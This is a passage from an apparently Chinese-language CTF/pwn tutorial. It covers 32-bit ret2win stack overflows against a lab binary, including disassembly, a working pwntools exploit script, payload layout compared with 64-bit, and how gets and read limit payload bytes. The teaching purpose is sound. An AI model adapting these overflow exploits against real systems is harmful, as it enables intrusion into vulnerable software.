
```bash
file vuln32
```

输出：

```
vuln32: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=9d8229d828530f356a53cc1470c40eadb54d323a, for GNU/Linux 3.2.0, not stripped
```

反汇编 vuln（cdecl 的参数与帧布局 [[R02-C语言与内存模型回顾#9. 三种调用约定的认法|R02 第 9 节]]讲过）：

```bash
objdump -d -M intel vuln32 | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
; i386 Linux / cdecl
080491ca <vuln>:
 80491ca:	55                   	push   ebp
 80491cb:	89 e5                	mov    ebp,esp
 80491cd:	83 ec 28             	sub    esp,0x28
 80491d0:	83 ec 0c             	sub    esp,0xc
 80491d3:	68 2d a0 04 08       	push   0x804a02d
 80491d8:	e8 73 fe ff ff       	call   8049050 <printf@plt>
 80491dd:	83 c4 10             	add    esp,0x10
 80491e0:	83 ec 0c             	sub    esp,0xc
 80491e3:	8d 45 d8             	lea    eax,[ebp-0x28]
 80491e6:	50                   	push   eax
 80491e7:	e8 74 fe ff ff       	call   8049060 <gets@plt>
 80491ec:	83 c4 10             	add    esp,0x10
 80491ef:	90                   	nop
 80491f0:	c9                   	leave
 80491f1:	c3                   	ret
```

两处先读出来。其一，==buf 在 `ebp-0x28`，实际占 40 字节==——源码声明的 32 字节被编译器向上取整，"偏移没有公式、以反汇编为准"在 32 位同样应验；偏移 = 40 + 4（保存的 ebp 在 32 位是 4 字节）= **44**。其二，参数压栈的形状（`sub esp,0xc`、`push`、`call`、`add esp,0x10`）是 cdecl 的日常，细节放折叠框。

再看 win 怎么读参数：

```bash
objdump -d -M intel vuln32 | sed -n '/<win>:/,/^$/p' | head -6
```

输出：

```asm
; i386 Linux / cdecl
08049196 <win>:
 8049196:	55                   	push   ebp
 8049197:	89 e5                	mov    ebp,esp
 8049199:	83 ec 08             	sub    esp,0x8
 804919c:	81 7d 08 be ba fe ca 	cmp    DWORD PTR [ebp+0x8],0xcafebabe
 80491a3:	75 12                	jne    80491b7 <win+0x21>
```

==`[ebp+0x8]` 就是第一个参数==——它是"返回地址的上一格"。cdecl 把参数全放在栈上：call 压入返回地址后，参数依次排在它上面。于是 ret2win 的 payload ==天然就把参数带在身上==：ret 弹出 win 的地址跳进去时，esp 正指着下一格，win 按 `[ebp+4]`（返回地址）、`[ebp+8]`（第一参数）往下读——==payload 的排列顺序就是参数顺序，一个 gadget 都不需要==：

```asm
; 32 位带参 ret2win 的栈布局（i386 Linux / cdecl，从 buf 起向高地址）
;   [44 字节填充            ]   填满 buf 与保存的 ebp
;   [win 地址               ]   ← vuln 的 ret 落在这里
;   [0xdeadbeef            ]   ← win 眼里的"返回地址"，收尾才用到
;   [0xcafebabe            ]   ← win 眼里的第一参数，[ebp+0x8] 读这里
```

注意两个 64 位没有的细节：假返回地址槽必须留（win 收尾的 ret 要弹它，值随意但不能省）；参数在 win 地址==之后==。对比着看两个位宽的 payload：

```python
# 64 位：参数走 rdi，需要 gadget 装载
b'A'*40 + p64(POP_RDI) + p64(KEY) + p64(WIN)
# 32 位：参数在栈上，跟在 win 地址后面顺序排
b'A'*44 + p32(WIN) + p32(0xdeadbeef) + p32(KEY)
```

打包换 `p32`（4 字节小端，解包用 `u32`），API 细节 [[P05-pwntools与GDB插件工具链|P5]]，字节序原理 [[R02-C语言与内存模型回顾#7. 大小端|R02 第 7 节]]。exploit：

```python
#!/usr/bin/env python3
# exp32.py —— 32 位带参 ret2win：参数直接排在返回地址后面
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

OFFSET = 44          # buf 实占 40 字节（ebp-0x28）+ 保存的 ebp 4 字节
WIN    = 0x8049196   # nm 查到的 win 地址
KEY    = 0xcafebabe  # win 要校验的参数值

io = process('./vuln32')
io.recvuntil(b'input> ')
io.sendline(b'A' * OFFSET + p32(WIN) + p32(0xdeadbeef) + p32(KEY))

success(io.recvline().decode().strip())
io.close()
```

输出：

```
[x] Starting local process './vuln32'
[+] flag{x86_stack_args}
```

对齐一行值得单独一句：==第 5 节的 movaps 崩溃只在 64 位出现==——cdecl 不对栈提 16 字节对齐要求，把第 5 节那个直调 system 的 win 搬到 32 位、原样直跳进去，flag 照常打印，三种修法在 32 位都用不上。

两种位宽一张表收束：

| | x64（System V AMD64） | x86（cdecl） |
| ---- | ---- | ---- |
| 参数位置 | 前 6 个在 rdi/rsi/rdx/rcx/r8/r9，第 7 个起栈上 | 全部在栈上 |
| 溢出摆参数 | 需要 `pop rdi; ret` 等 gadget 装寄存器 | 参数槽紧挨返回地址，payload 顺序即参数顺序 |
| 栈上多摆的槽 | gadget 地址 + 参数值 | 假返回地址 + 各参数 |
| 地址打包 | `p64`（8 字节） | `p32`（4 字节） |
| saved rbp 宽度 | 8 字节 | 4 字节 |
| 16 字节对齐问题 | 有（第 5 节） | 无（cdecl 不对栈提 16 字节对齐要求） |

> [!info]- 32 位 -O0 产物里的对齐舞步
> 上面反汇编里 `sub esp,0xc` 加 `push` 再加 `add esp,0x10` 的组合，是 gcc 在 32 位 -O0 下调函数前的固定排法：先划出一块对齐的参数区，再把参数压进去，返回后整体收回。它让每次 call 前栈保持对齐，是编译器替程序员做的事——读反汇编时按"call 前的 push 就是在摆参数"理解即可，不必逐条抠。另外 32 位下 buf 被"向上取整"到 40 字节、而不是声明的 32，与 64 位一节看到的 `sub rsp,0x20`（恰好 32）不同——==两边的共同教训：局部区大小看反汇编，不背公式==。

## 7. 输入函数与 payload：gets 与 read 的差别

payload 要过输入函数这一关：==函数在哪停下，决定了哪些字节能进缓冲区==。两个最小程序对比，缓冲区先填满 0xff 做记号，看同一份输入各留下什么：

```c
/* stop_gets.c —— gets 往缓冲区里放了什么（x86-64 Linux） */
#include <stdio.h>
#include <string.h>

char *gets(char *s);

int main(void) {
    char a[8];
    memset(a, 0xff, 8);
    gets(a);
    for (int i = 0; i < 8; i++) printf("%02x ", (unsigned char)a[i]);
    printf("\n");
    return 0;
}
```

```c
/* stop_read.c —— read 往缓冲区里放了什么（x86-64 Linux） */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void) {
    char b[8];
    int n;
    memset(b, 0xff, 8);
    n = (int)read(0, b, 8);
    printf("read = %d: ", n);
    for (int i = 0; i < 8; i++) printf("%02x ", (unsigned char)b[i]);
    printf("\n");
    return 0;
}
```

同一份输入 `AA \x00 BB \n CCCC`（十六进制 `41 41 00 42 42 0a 43 43 43 43`）分别喂给两个程序：

```bash
printf 'AA\x00BB\nCCCC' | ./stop_gets
```

输出：

```
41 41 00 42 42 00 ff ff 
```

```bash
printf 'AA\x00BB\nCCCC' | ./stop_read
```

输出：

```
read = 8: 41 41 00 42 42 0a 43 43 
```

逐字节判读。gets 的缓冲区：下标 0–4 是 `41 41 00 42 42`——==\x00 原样进了缓冲区==（下标 2 的 00 是输入内容，不是结尾符）；下标 5 的 00 是 gets 收尾补的 `\0`；后面还是 ff——==\n 连同它后面的 CCCC 都没进来==。read 的缓冲区：8 字节照单全收，`\x00` 和 `\x0a` 都原样进入，第 9 字节 C 留在了管道里。

| 函数 | 何时停 | \x00 | \x0a | 对 payload 的要求 |
| ---- | ---- | ---- | ---- | ---- |
| gets | 读到 \n（\n 不入缓冲，补 \0） | 照收 | ==截断== | 地址字节里不能有 0x0a；`sendline` 结尾的 \n 正是它的停止符 |
| read(0, buf, n) | 攒够 n 字节，或暂时无数据可读 | 照收 | 照收 | 任意字节都能过；==一次 send 发全量==，分批发可能被截在前半段 |

两个推论直接影响写 exploit。其一，==先看漏洞函数再定发送方式==：gets 配 `sendline`，read 配 `send` 且一次发全——read 在管道上拿到多少取决于发送方一次送来多少，交互节奏没对齐时程序只收到半份 payload。其二，地址字节撞上 0x0a（gets 类）会截断、地址高位常含的 \x00 会被 strcpy/`printf("%s")` 一族当结尾——这两类都是 badchar 问题，本章先记住=="函数的停止规则决定 payload 能带什么字节"==，系统的应对方法 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 展开。危险函数的完整清单与判别方法 [[P02-前置基础C汇编与Linux|P2]]。

## 8. 本地、远程与调试环境的一致性

两个"本地通、换个环境不通"的经典来源，各一句话记牢。

**payload 的一致性**：==本地与远程跑的是同一个程序==（[[P01-PWN导论与缓解机制全景#1. PWN 是什么：从“读懂”到“控制”|P1 第 1 节]]），偏移、gadget、程序内的函数地址全部一致；会不一致的只有 libc 的函数地址——远程版本与本地不同时要按题目附件对齐（识别与匹配 [[P03-ELF链接与延迟绑定|P3]]）。本章的 payload 只含程序内固定地址（无 PIE），本地通则远程通。

**GDB 的环境差异**：gdb 启动程序时继承的是 gdb 自己的环境变量，==栈的起点会因此挪位==，栈上数据的地址与直接运行不同；gdb 默认关闭 ASLR 只保证"会话之内地址稳定"，不保证与裸跑一致。本章 payload 不含栈地址，无感；等 payload 里出现栈地址（[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 的泄露型利用）时，"gdb 里通、裸跑不通"的第一排查点就是它，根治办法是让地址靠泄露而不是靠猜。

> [!info]- 环境差异的排查法
> gdb 里 `show environment` 能看到它会话的环境；`unset environment LINES`、`unset environment COLUMNS` 可以去掉 gdb 自己塞进去的两个变量。pwntools 侧用 `process('./vuln', env={})` 给出固定环境。两边环境一致后，栈地址仍然只在没有 ASLR 的会话内稳定——所以这些手段都只是调试辅助，==正解是 payload 不依赖栈地址==。

## 9. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `pwn cyclic -l` 报 pattern not found | 反查的字节不完整或不是返回地址槽：确认取的是崩溃时 rsp 指向的 8 字节（2.1 的 x/gx $rsp） |
| cyclic 查出一个"像模像样"却对不上的偏移 | 生成与反查的 n 不一致，工具按当前 n 截了低位字节（2.1 的 warning） |
| ret 之后崩在 0x4141414141414141 | 返回地址槽里还是填充：偏移不够或地址没拼上，检查 p64 是否真的接在第 41 字节起 |
| 利用链每步都对，崩在 libc 内部的 movaps | 16 字节对齐差 8：按第 5 节垫 ret gadget，或换 win+5 入口 |
| 带参链打出了 wrong key | 链通了、参数错了：检查 pop rdi 后面跟的值与槽的顺序（4.4） |
| exploit 发完直接 EOF，什么都没收到 | 偏移或地址不对，程序半路崩；进 gdb 看 ret 到底弹出了什么 |
| recvline 收到的第一行是空的 | 提示符是 puts 打的、自带换行，残留的空行被先读走了；recvuntil 的串与程序实际输出对齐，或源码改用 printf 提示符 |
| 32 位 payload 打 64 位程序（或反过来） | 位宽搞混：p32/p64、saved rbp 是 4 字节还是 8 字节，先 file 确认位数再动手 |
| read 版漏洞程序时通时崩 | read 攒不满 n 字节就返回，分批发送会截断 payload；一次 send 发全量（第 7 节） |
| gdb 里通的 exploit，直接运行不通 | payload 依赖了栈地址，而 gdb 的环境变量让栈挪位（第 8 节；根治靠泄露，P7） |
